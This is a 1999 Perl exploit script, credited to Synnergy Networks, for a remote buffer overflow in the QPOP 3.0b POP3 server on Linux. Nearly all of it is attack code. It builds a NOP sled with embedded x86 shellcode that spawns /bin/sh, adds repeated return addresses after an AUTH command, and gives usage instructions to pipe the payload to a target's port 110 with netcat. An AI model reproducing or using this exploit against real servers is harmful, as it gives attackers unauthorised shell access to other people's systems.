#!/usr/bin/perl
# *** Synnergy Networks

# * Description:
#
# Remote buffer overflow exploit for QPOP 3.0b<=20 
# running on Linux.
# (based on code by sk8@lucid-solutions.com)

# * Author:
#
# headflux (hf@synnergy.net)
# Synnergy Networks (c) 1999,  http://www.synnergy.net

# * Usage:
# ./qpop-linux.pl <offset> | nc -v <hostname> 110

# *** Synnergy Networks

$nop    = "\x90";
#$offset        = 0;

$shell  = "\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa";
$shell  .= "\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04";
$shell  .= "\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff";
$shell  .= "\xff\xff/bin/sh";

#$i     = 0;
$buflen = 990;
$ret    = 0xbfffd304;
$cmd    = "AUTH ";

if(defined $ARGV[0])
{
        $offset = $ARGV[0];
}

$buf = $nop x $buflen;
substr($buf, 0, length($cmd))		= "$cmd";
substr($buf, 800, length($shell))       = "$shell";

for ($i=800+length($shell) + 2; $i < $buflen - 4; $i += 4)
{
        substr($buf, $i, length($ret + offset)) = pack(l,$ret + $offset);
}

# substr($buf, $buflen - 2, 1)  = "\n";
# substr($buf, $buflen - 1, 1)  = "\n";

#$buf   .= "\n";

printf STDOUT "$buf\n";

# EndOfFile
